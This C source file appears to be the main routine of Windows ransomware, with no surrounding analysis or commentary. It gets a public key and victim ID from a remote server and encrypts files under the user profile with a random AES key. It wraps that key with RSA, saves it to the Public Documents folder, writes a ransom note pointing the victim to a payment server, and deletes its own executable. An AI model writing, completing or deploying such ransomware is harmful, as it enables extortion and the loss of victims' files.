#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "keygen.h"
#include "delete.h"
#include "config.h"
#include "utils.h"
#include "encrypt.h"
#include "files.h"
#include "aes.h"
#include <windows.h>
#include <shlobj.h>

int main(int argc, char *argv[]) {
    int id;
    char pubkey[512];
    if (!get_key(&id, pubkey)) {
        printf("Failed to retrieve public key from server\n");
        return 1;
    }
   unsigned char aes_key[32];
    if (!generate_random_key(aes_key, sizeof(aes_key))) {
        printf("Failed to generate AES key\n");
        return 1;
    }

    char users_path[MAX_PATH];
    HRESULT result = SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, users_path);
    if (result != S_OK) {
        printf("Failed to get user profile path\n");
        return 1;
    }
    enumerate(users_path, aes_key);

    unsigned char *encrypted_key = NULL;
    size_t encrypted_len = 0;
    if (!encrypt_aes_key_with_rsa(aes_key, sizeof(aes_key), pubkey, &encrypted_key, &encrypted_len)) {
        printf("Failed to encrypt AES key\n");
        return 1;
    }

    FILE *key_file = fopen("C:\\Users\\Public\\Documents\\key.enc", "wb");
    if (!key_file) {
        printf("Failed to open key.enc for writing\n");
        free(encrypted_key);
        return 1;
    }
    fwrite(encrypted_key, 1, encrypted_len, key_file);
    fclose(key_file);

    const char *VERIFY_STRING = "This key is valid";
    size_t verify_len = strlen(VERIFY_STRING);
    unsigned char *encrypted_verify = NULL;
    size_t encrypted_verify_len = 0;
    if (!encrypt_aes_key_with_rsa((unsigned char *)VERIFY_STRING, verify_len, pubkey, &encrypted_verify, &encrypted_verify_len)) {
        printf("Failed to encrypt verification string\n");
        free(encrypted_key);
        free(encrypted_verify);
        return 1;
    }

    FILE *verify_file = fopen("C:\\Users\\Public\\Documents\\verify.enc", "wb");
    if (!verify_file) {
        printf("Failed to open verify.enc for writing\n");
        free(encrypted_key);
        free(encrypted_verify);
        return 1;
    }
    fwrite(encrypted_verify, 1, encrypted_verify_len, verify_file);
    fclose(verify_file);

    free(encrypted_key);
    free(encrypted_verify);

    char ransom_note[1024];
    snprintf(ransom_note, sizeof(ransom_note),
             "Your files have been encrypted!\n"
             "To decrypt them, visit %s and enter the ID: %d\n"
             "Follow the instructions there to retrieve your decryption key.\n"
             "DO NOT DELETE key.enc or verify.enc! If you do, you won't be able to recover your files.",
             SERVER_URL, id);
    if (!create_readme(ransom_note)) {
        printf("Failed to create ransom note\n");
        return 1;
    }

    self_delete(argv[0]);

    printf("Encryption completed.\n");
    return 0;
}
